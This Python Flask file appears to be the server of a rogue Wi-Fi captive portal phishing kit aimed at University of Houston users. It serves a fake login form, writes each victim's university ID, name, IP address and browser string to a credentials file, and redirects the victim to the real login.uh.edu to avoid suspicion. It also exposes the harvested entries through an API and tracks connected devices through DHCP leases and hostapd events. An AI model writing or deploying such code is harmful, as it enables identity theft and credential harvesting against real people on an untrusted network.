from flask import Flask, request, redirect, render_template, jsonify, send_from_directory
from flask_cors import CORS
from datetime import datetime
import requests
import os
import ast
import subprocess
import re
import time

app = Flask(__name__, static_folder='static')  # Set the static folder explicitly
CORS(app)  # Enable CORS for development

# Global dictionary to track connected clients
connected_clients = {}

# Ensure creds directory exists
if not os.path.exists('creds'):
    os.makedirs('creds')
    with open('creds/credentials.txt', 'a') as f:
        pass  # Create empty file

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        data = {
            'timestamp': datetime.now().isoformat(),
            'uh_id': request.form.get('uid'),
            'first_name': request.form.get('fname'),
            'last_name': request.form.get('lname'),
            'ip': request.remote_addr,
            'ua': request.headers.get('User-Agent')
        }

        # Save to file
        try:
            with open("creds/credentials.txt", "a") as f:
                f.write(f"{data}\n")
        except Exception as e:
            print(f"Error writing to credentials file: {e}")

        return redirect("https://login.uh.edu")

    try:
        return render_template("login.html")
    except Exception as e:
        print(f"Error rendering login template: {e}")
        return str(e), 500

@app.route('/dashboard')
def dashboard():
    try:
        if os.path.exists('frontend/build'):
            return send_from_directory('frontend/build', 'index.html')
        return render_template("dashboard.html")
    except Exception as e:
        print(f"Error serving dashboard: {e}")
        return str(e), 500

@app.route('/api/creds')
def creds_api():
    entries = []
    creds_file = "creds/credentials.txt"
    if os.path.exists(creds_file):
        try:
            with open(creds_file, "r") as f:
                for line in f:
                    try:
                        entry = ast.literal_eval(line.strip())
                        entries.append(entry)
                    except Exception as e:
                        print(f"Error parsing line: {e}")
                        continue
        except Exception as e:
            print(f"Error reading credentials file: {e}")
    return jsonify(entries)

@app.route('/api/connections')
def connections_api():
    try:
        print("[DEBUG] Starting connections_api()")
        result = []
        
        # Get DHCP leases for connected clients
        if os.path.exists('/var/lib/misc/dnsmasq.leases'):
            with open('/var/lib/misc/dnsmasq.leases', 'r') as f:
                leases_content = f.read()
                print(f"[DEBUG] Reading DHCP leases")
                for line in leases_content.split('\n'):
                    parts = line.strip().split()
                    if len(parts) >= 4:
                        timestamp, mac, ip, hostname = parts[0:4]
                        client_info = {
                            'mac': mac,
                            'ip': ip,
                            'hostname': hostname,
                            'connected_since': int(timestamp),
                            'rx_mb': connected_clients.get(mac, {}).get('rx_mb', 0),
                            'tx_mb': connected_clients.get(mac, {}).get('tx_mb', 0),
                            'status': 'Connected' if mac in connected_clients and connected_clients[mac]['connected'] else 'Disconnected'
                        }
                        result.append(client_info)

        print(f"[DEBUG] Returning {len(result)} clients")
        return jsonify(result)
    except Exception as e:
        print(f"[DEBUG] Error in connections_api: {str(e)}")
        print(f"[DEBUG] Error type: {type(e)}")
        import traceback
        print(f"[DEBUG] Traceback: {traceback.format_exc()}")
        return jsonify([])

# Event handlers for hostapd events
def handle_client_connect(mac):
    print(f"[DEBUG] Client connected: {mac}")
    connected_clients[mac] = {
        'connected': True,
        'connect_time': time.time(),
        'duration': 'Just connected',
        'signal_dbm': 'N/A',
        'rx_mb': 0,
        'tx_mb': 0
    }

def handle_client_disconnect(mac):
    print(f"[DEBUG] Client disconnected: {mac}")
    if mac in connected_clients:
        connected_clients[mac]['connected'] = False

def update_client_durations():
    current_time = time.time()
    for mac, client in connected_clients.items():
        if client['connected']:
            duration = int(current_time - client['connect_time'])
            hours = duration // 3600
            minutes = (duration % 3600) // 60
            client['duration'] = f"{hours}h {minutes}m"

# Update durations periodically
@app.before_request
def before_request():
    update_client_durations()

# Event handler route for hostapd events
@app.route('/api/events', methods=['POST'])
def handle_event():
    event = request.json
    if event['type'] == 'connect':
        handle_client_connect(event['mac'])
    elif event['type'] == 'disconnect':
        handle_client_disconnect(event['mac'])
    return jsonify({'status': 'ok'})

# Serve React static files
@app.route('/dashboard/static/js/<path:filename>')
@app.route('/dashboard/static/css/<path:filename>')
@app.route('/dashboard/static/media/<path:filename>')
def serve_react_static(filename):
    if filename.startswith('main.'):
        folder = 'js' if '/js/' in request.path else 'css'
        return send_from_directory(f'frontend/build/static/{folder}', filename)
    return send_from_directory('frontend/build/static/media', filename)

# Serve captive portal static files
@app.route('/static/<path:filename>')
def serve_portal_static(filename):
    return send_from_directory('static', filename)

# Serve other React assets
@app.route('/dashboard/manifest.json')
def serve_manifest():
    return send_from_directory('frontend/build', 'manifest.json')

@app.route('/dashboard/favicon.ico')
def serve_favicon():
    return send_from_directory('frontend/build', 'favicon.ico')

@app.route('/dashboard/logo192.png')
def serve_logo():
    return send_from_directory('frontend/build', 'logo192.png')

if __name__ == '__main__':
    print(f"Starting Flask server on port 443...")
    print(f"Templates directory: {os.path.abspath('templates')}")
    print(f"Static directory: {os.path.abspath('static')}")
    print(f"React build directory: {os.path.abspath('frontend/build')}")
    app.run(host='0.0.0.0', port=443, ssl_context=('cert.crt', 'cert.key'), debug=True)
